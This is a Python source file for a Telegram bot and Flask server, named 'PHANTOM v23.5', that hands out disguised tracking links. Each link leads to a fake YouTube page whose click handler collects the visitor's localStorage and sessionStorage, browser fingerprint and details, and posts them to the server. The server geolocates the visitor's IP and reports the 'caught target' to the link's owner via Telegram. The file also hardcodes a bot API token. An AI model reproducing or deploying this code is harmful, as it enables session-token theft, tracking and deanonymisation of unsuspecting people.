import asyncio
import threading
import requests
import uuid
import json
import os
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000)) # Render сам подставит нужный порт

app = Flask(__name__)
exploit_vault = {} 
user_settings = {} 

PAYLOADS = {
    "SESSION_LEAK": {
        "name": "🕵️ Social Session Leak",
        "js": "d.storage = {ls: JSON.stringify(localStorage), ss: JSON.stringify(sessionStorage)};",
        "vuln": "Session Data Extraction"
    },
    "OSINT_DEEP": {
        "name": "📊 Deep Hardware OSINT",
        "js": "d.cores=navigator.hardwareConcurrency; d.plat=navigator.platform;",
        "vuln": "Fingerprinting"
    }
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
<body style="margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh;" onclick="strike()">
    <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; cursor:pointer;">
    <div style="position:absolute; width:70px; height:50px; background:red; border-radius:12px;"></div>
<script>
async function strike() {
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height };
    try { {{ custom_script|safe }} } catch(e) {}
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; });
}
</script>
</body>
</html>
"""

@app.route('/')
def home(): return "OK", 200

@app.route('/v/<aid>')
def trap(aid):
    mode = user_settings.get(str(aid), "SESSION_LEAK")
    script = PAYLOADS.get(mode, PAYLOADS["SESSION_LEAK"])["js"]
    return render_template_string(HTML_TRAP, aid=aid, custom_script=script)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    # ФЕРЗЕВЫЙ ГАМБИТ С IP: Берем реальный IP из заголовков Render/Cloudflare
    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    geo = {}
    try:
        r = requests.get(f"http://ip-api.com/json/{real_ip}").json()
        if r['status'] == 'success': geo = r
    except: pass

    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    exploit_vault[token] = {"data": d, "geo": geo}

    report = (
        f"🎯 **ЦЕЛЬ ПОЙМАНА!**\n"
        f"🌐 IP: `{real_ip}`\n"
        f"📍 ГЕО: `{geo.get('city', 'N/A')}, {geo.get('country', 'N/A')}`\n"
        f"🏢 Провайдер: `{geo.get('isp', 'N/A')}`\n"
        f"🗺 [Карта](http://google.com/maps?q={geo.get('lat')},{geo.get('lon')})\n"
        f"🔑 Токен: `{token}`"
    )
    # Отправляем через requests, так как мы в потоке Flask
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    await message.answer("🕶 **PHANTOM v23.5 READY**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать ссылку")
async def create(message: types.Message):
    kb = InlineKeyboardBuilder()
    for k in PAYLOADS.keys(): kb.button(text=PAYLOADS[k]["name"], callback_data=f"p_{k}")
    await message.answer("Выбери режим:", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("p_"))
async def gen(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_settings[str(callback.from_user.id)] = mode
    await callback.message.edit_text(f"✅ Ссылка: `{BASE_URL}/v/{callback.from_user.id}`")

async def run_bot():
    await dp.start_polling(bot)

if __name__ == "__main__":
    # 1. Запускаем Flask в отдельном потоке
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False), daemon=True).start()
    # 2. Запускаем бота в основном потоке
    asyncio.run(run_bot())
